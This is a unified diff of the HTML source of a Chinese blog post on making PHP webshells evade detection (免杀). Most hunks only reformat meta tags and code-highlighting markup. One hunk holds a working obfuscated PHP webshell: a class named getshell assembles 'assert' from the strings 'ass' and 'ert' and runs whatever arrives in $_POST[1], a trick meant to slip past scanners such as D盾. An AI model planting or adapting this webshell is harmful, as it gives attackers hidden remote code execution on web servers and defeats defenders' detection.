@@ -10,13 +10,12 @@
     <title>[知识星球]WebShell免杀之PHP - </title><meta name="Description" content="yzddMr6&#39;s Blog"><meta property="og:title" content="[知识星球]WebShell免杀之PHP" />
 <meta property="og:description" content="1 前言php的免杀可以说是已经被说烂了。 由于php特别灵活，所产生的变种也是层出不穷 但是与此同时，D盾等waf的检测也格外严格。 有时候写的比" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://yzddmr6.com/posts/webshell-bypass-php/" /><meta property="og:image" content="https://yzddmr6.com/images/avatar.webp"/><meta property="article:section" content="posts" />
+<meta property="og:url" content="https://yzddmr6.com/posts/webshell-bypass-php/" /><meta property="og:image" content="https://yzddmr6.com/images/avatar.webp" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2019-10-11T10:09:42+00:00" />
 <meta property="article:modified_time" content="2019-10-11T10:09:42+00:00" /><meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
-<meta name="twitter:card" content="summary_large_image"/>
-<meta name="twitter:image" content="https://yzddmr6.com/images/avatar.webp"/>
 
-<meta name="twitter:title" content="[知识星球]WebShell免杀之PHP"/>
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://yzddmr6.com/images/avatar.webp" /><meta name="twitter:title" content="[知识星球]WebShell免杀之PHP"/>
 <meta name="twitter:description" content="1 前言php的免杀可以说是已经被说烂了。 由于php特别灵活，所产生的变种也是层出不穷 但是与此同时，D盾等waf的检测也格外严格。 有时候写的比"/>
 <meta name="application-name" content="yzddMr6&#39;s Blog">
 <meta name="apple-mobile-web-app-title" content="yzddMr6&#39;s Blog">
@@ -367,23 +366,23 @@
 </span><span class="lnt">17
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PHP 定义类通常语法格式如下：
-</span></span><span class="line"><span class="cl">&lt;?php
-</span></span><span class="line"><span class="cl">class phpClass {
-</span></span><span class="line"><span class="cl">  var $var1;
-</span></span><span class="line"><span class="cl">  var $var2 = &#34;constant string&#34;;
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">PHP</span> <span class="err">定义类通常语法格式如下：</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="n">phpClass</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">var</span> <span class="o">$</span><span class="n">var1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">var</span> <span class="o">$</span><span class="n">var2</span> <span class="o">=</span> <span class="s2">&#34;constant string&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">  
-</span></span><span class="line"><span class="cl">  function myfunc ($arg1, $arg2) {
-</span></span><span class="line"><span class="cl">     [..]
-</span></span><span class="line"><span class="cl">  }
-</span></span><span class="line"><span class="cl">  [..]
-</span></span><span class="line"><span class="cl">}
-</span></span><span class="line"><span class="cl">?&gt;
-</span></span><span class="line"><span class="cl">解析如下：
-</span></span><span class="line"><span class="cl">类使用 class 关键字后加上类名定义。
-</span></span><span class="line"><span class="cl">类名后的一对大括号({})内可以定义变量和方法。
-</span></span><span class="line"><span class="cl">类的变量使用 var 来声明, 变量也可以初始化值。
-</span></span><span class="line"><span class="cl">函数定义类似 PHP 函数的定义，但函数只能通过该类及其实例化的对象访问。
+</span></span><span class="line"><span class="cl">  <span class="n">function</span> <span class="n">myfunc</span> <span class="p">(</span><span class="o">$</span><span class="n">arg1</span><span class="p">,</span> <span class="o">$</span><span class="n">arg2</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">     <span class="p">[</span><span class="o">..</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="o">..</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="err">?</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="err">解析如下：</span>
+</span></span><span class="line"><span class="cl"><span class="err">类使用</span> <span class="k">class</span> <span class="err">关键字后加上类名定义。</span>
+</span></span><span class="line"><span class="cl"><span class="err">类名后的一对大括号</span><span class="p">({})</span><span class="err">内可以定义变量和方法。</span>
+</span></span><span class="line"><span class="cl"><span class="err">类的变量使用</span> <span class="k">var</span> <span class="err">来声明</span><span class="p">,</span> <span class="err">变量也可以初始化值。</span>
+</span></span><span class="line"><span class="cl"><span class="err">函数定义类似</span> <span class="n">PHP</span> <span class="err">函数的定义，但函数只能通过该类及其实例化的对象访问。</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="免杀套路" class="headerLink">
@@ -880,23 +879,23 @@
 </span><span class="lnt">17
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
-</span></span><span class="line"><span class="cl">class get{
-</span></span><span class="line"><span class="cl">    public function setName($name){
-</span></span><span class="line"><span class="cl">        return $this -&gt; name = $name;
-</span></span><span class="line"><span class="cl">    }
-</span></span><span class="line"><span class="cl">}
-</span></span><span class="line"><span class="cl">class getshell extends get{
-</span></span><span class="line"><span class="cl">    public $name = &#34;ass&#34;;
-</span></span><span class="line"><span class="cl">    public $name2 = &#34;ert&#34;;
-</span></span><span class="line"><span class="cl">}
-</span></span><span class="line"><span class="cl">$shell = new getshell();
-</span></span><span class="line"><span class="cl">$gshell = $shell -&gt; name;
-</span></span><span class="line"><span class="cl">$gshell2 = $shell -&gt; name2;
-</span></span><span class="line"><span class="cl">$b = $shell -&gt; setName(&#34;$_POST[1]&#34;);
-</span></span><span class="line"><span class="cl">$s = $gshell.$gshell2;
-</span></span><span class="line"><span class="cl">$s($b);
-</span></span><span class="line"><span class="cl">?&gt;
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="n">get</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="n">function</span> <span class="n">setName</span><span class="p">(</span><span class="o">$</span><span class="n">name</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">$</span><span class="n">this</span> <span class="o">-&gt;</span> <span class="n">name</span> <span class="o">=</span> <span class="o">$</span><span class="n">name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="n">getshell</span> <span class="k">extends</span> <span class="n">get</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="o">$</span><span class="n">name</span> <span class="o">=</span> <span class="s2">&#34;ass&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="o">$</span><span class="n">name2</span> <span class="o">=</span> <span class="s2">&#34;ert&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">shell</span> <span class="o">=</span> <span class="n">new</span> <span class="n">getshell</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">gshell</span> <span class="o">=</span> <span class="o">$</span><span class="n">shell</span> <span class="o">-&gt;</span> <span class="n">name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">gshell2</span> <span class="o">=</span> <span class="o">$</span><span class="n">shell</span> <span class="o">-&gt;</span> <span class="n">name2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">b</span> <span class="o">=</span> <span class="o">$</span><span class="n">shell</span> <span class="o">-&gt;</span> <span class="n">setName</span><span class="p">(</span><span class="s2">&#34;$_POST[1]&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">s</span> <span class="o">=</span> <span class="o">$</span><span class="n">gshell</span><span class="o">.$</span><span class="n">gshell2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">s</span><span class="p">(</span><span class="o">$</span><span class="n">b</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="err">?</span><span class="o">&gt;</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p><strong>类反射绕过</strong></p>
@@ -1135,7 +1134,7 @@
     </div>
 
     <div class="post-info-more">
-        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/webshell/">webshell</a>,&nbsp;<a href="/tags/%E5%85%8D%E6%9D%80/">免杀</a></section>
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/webshell/">Webshell</a>,&nbsp;<a href="/tags/%E5%85%8D%E6%9D%80/">免杀</a></section>
         <section>
             <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
         </section>
